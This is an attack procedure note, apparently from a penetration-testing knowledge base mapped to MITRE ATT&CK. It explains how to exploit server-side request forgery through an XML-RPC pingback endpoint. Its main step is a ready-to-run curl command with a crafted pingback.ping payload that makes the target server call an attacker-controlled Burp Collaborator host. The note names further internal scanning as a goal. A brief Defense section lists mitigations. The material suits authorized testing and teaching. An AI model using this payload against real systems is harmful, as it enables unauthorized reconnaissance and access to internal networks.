---
id: proc-craft-xmlrpc-ssrf
tags:
  - ssrf
  - xml-rpc
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-xmlrpc-ssrf-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.760Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-XML-RPC-Pingback-Request-for-SSRF

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in the XML-RPC pingback endpoint by crafting a POST request with a malicious XML payload that forces the server to request an arbitrary URL, confirmed via out-of-band interactions using Burp Collaborator.

## Description

The target web application, hosted on ASP.NET with IIS 8.5, processes user-supplied XML in the pingback.ping method without validation, allowing attackers to specify external URLs for server-side fetches. This enables reconnaissance of internal networks, port scanning, and interaction with internal services. The procedure focuses on initial confirmation of the vulnerability by monitoring DNS requests to a collaborator domain.

## Requirements

1. Access to Burp Collaborator for out-of-band detection
2. HTTP client like curl to send POST requests
3. Knowledge of the target domain and endpoint (/xmlrpc/pingback/)

## Defense

Defensive measures and detection strategies:

- Validate and whitelist allowed URLs/protocols in XML parsing
- Disable or restrict XML-RPC endpoints if unused
- Monitor outgoing network traffic for anomalous DNS requests
- Implement response size limits to prevent DoS

## Objectives

1. Trigger SSRF to confirm vulnerability
2. Detect server-side requests via collaborator logs
3. Lay groundwork for further internal scanning

## Instructions

### Step 1: Generate Collaborator Domain

**Context**: Create a unique domain in Burp Collaborator to monitor for incoming requests from the target server.

No command required; use Burp Suite interface to poll for interactions.

### Step 2: Send SSRF Trigger Request

**Context**: Craft and execute the XML-RPC POST request using the collaborator URL as the target parameter.

**Command** ([[commands/curl-xmlrpc-ssrf-trigger]]):
```bash
curl -X POST https://target.com/xmlrpc/pingback/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-collaborator.burpcollaborator.net/</string></value></param><param><value><string>https://target.com/web/guest/home/</string></value></param></params></methodCall>'
```

> This sends the pingback.ping method with the first param as the arbitrary target URL and the second as a source URL from the target site. Expected output is an HTTP 200 with XML response; check Burp Collaborator for DNS resolution confirming SSRF.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xmlrpc-ssrf-trigger]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- ssrf
- xml-rpc
